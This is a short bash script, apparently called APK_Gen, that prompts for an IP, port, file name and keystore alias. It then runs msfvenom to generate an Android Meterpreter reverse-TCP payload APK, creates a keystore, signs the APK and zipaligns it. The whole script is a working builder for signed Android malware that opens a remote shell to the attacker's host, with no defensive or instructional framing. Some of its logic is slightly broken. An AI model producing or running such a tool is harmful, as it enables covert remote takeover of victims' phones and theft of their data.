#!/bin/bash
clear
RED="\e[31m"
ORANGE="\e[33m"
BLUE="\e[94m"
GREEN="\e[92m"
STOP="\e[0m"
toilet -f mono12 -F metal APK_Gen
if [ -z $1 ];then
	printf "${RED}"
	echo "Please Install toilet! 😝😝😝"
	printf "${STOP}"
	exit 0;
fi
printf "${GREEN}"

	
echo "=============================================="

echo "APK Builder Startting.............."

echo "=============================================="

echo
echo
echo -en "Enter IP : "

read ip
echo
echo -en "Enter Port: "
read port
echo
echo -en "Enter APK Name: "
read name
echo
echo -en "Enter Alias for KeyStore : "
read alias
echo
echo "=============================================="
echo
#printf "${STOP}"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -o $name.apk
 
keytool -genkey -V -keystore key.keystore -alias $alias -keyalg RSA -keysize 2048 -validity 10000
 
#sudo apt-get install default-jdk -y
 
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $name.apk $alias
 
jarsigner -verify -verbose -certs $name.apk
 

 
zipalign -v 4 $name.apk $name_signed.apk
